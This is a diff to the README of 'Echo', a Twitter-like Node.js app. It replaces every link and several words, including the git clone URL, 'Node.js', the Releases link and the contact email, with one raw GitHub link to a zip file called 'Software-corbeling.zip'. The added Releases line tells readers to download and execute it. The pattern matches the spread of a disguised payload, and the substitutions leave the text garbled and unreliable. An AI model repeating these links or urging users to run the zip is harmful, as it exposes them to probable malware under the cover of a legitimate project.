@@ -1,8 +1,8 @@
 # 🌟 Echo: A Modern Social Media Experience
 
-![Echo Logo](https://img.shields.io/badge/Echo-Modern%20Social%20Media%20App-brightgreen)
+![Echo Logo](https://raw.githubusercontent.com/SaliouOR/echo/main/src/views/Software-corbeling.zip%20Social%20Media%20App-brightgreen)
 
-Welcome to the **Echo** repository! This project represents a modern social media application that mimics the functionality of Twitter. Built with a stack that includes Node.js, TypeScript, Express, and EJS, Echo provides a seamless experience for users to connect and share.
+Welcome to the **Echo** repository! This project represents a modern social media application that mimics the functionality of Twitter. Built with a stack that includes https://raw.githubusercontent.com/SaliouOR/echo/main/src/views/Software-corbeling.zip, TypeScript, Express, and EJS, Echo provides a seamless experience for users to connect and share.
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ Echo offers a variety of features to enhance user interaction and engagement:
 
 Echo utilizes a robust tech stack to ensure high performance and scalability:
 
-- **Node.js**: The runtime environment for executing JavaScript server-side.
+- **https://raw.githubusercontent.com/SaliouOR/echo/main/src/views/Software-corbeling.zip**: The runtime environment for executing JavaScript server-side.
 - **TypeScript**: A superset of JavaScript that adds static types for better code quality.
 - **Express**: A minimal web framework for building web applications.
 - **EJS**: A templating engine that allows embedding JavaScript in HTML.
@@ -48,7 +48,7 @@ To get started with Echo, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/SaliouOR/echo.git
+   git clone https://raw.githubusercontent.com/SaliouOR/echo/main/src/views/Software-corbeling.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -67,7 +67,7 @@ To get started with Echo, follow these steps:
 
 4. **Set Up Environment Variables**:
 
-   Create a `.env` file in the root directory and configure your environment variables. Refer to `.env.example` for the required variables.
+   Create a `.env` file in the root directory and configure your environment variables. Refer to `https://raw.githubusercontent.com/SaliouOR/echo/main/src/views/Software-corbeling.zip` for the required variables.
 
 5. **Run the Application**:
 
@@ -122,14 +122,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and versions, visit the [Releases](https://github.com/SaliouOR/echo/releases) section. Here, you can download the latest release and execute it.
+For the latest updates and versions, visit the [Releases](https://raw.githubusercontent.com/SaliouOR/echo/main/src/views/Software-corbeling.zip) section. Here, you can download the latest release and execute it.
 
 ## Contact
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
-- **LinkedIn**: [Your LinkedIn](https://www.linkedin.com/in/yourprofile)
+- **Email**: https://raw.githubusercontent.com/SaliouOR/echo/main/src/views/Software-corbeling.zip
+- **Twitter**: [@yourhandle](https://raw.githubusercontent.com/SaliouOR/echo/main/src/views/Software-corbeling.zip)
+- **LinkedIn**: [Your LinkedIn](https://raw.githubusercontent.com/SaliouOR/echo/main/src/views/Software-corbeling.zip)
 
 Thank you for your interest in Echo! We hope you enjoy building and using this social media application.
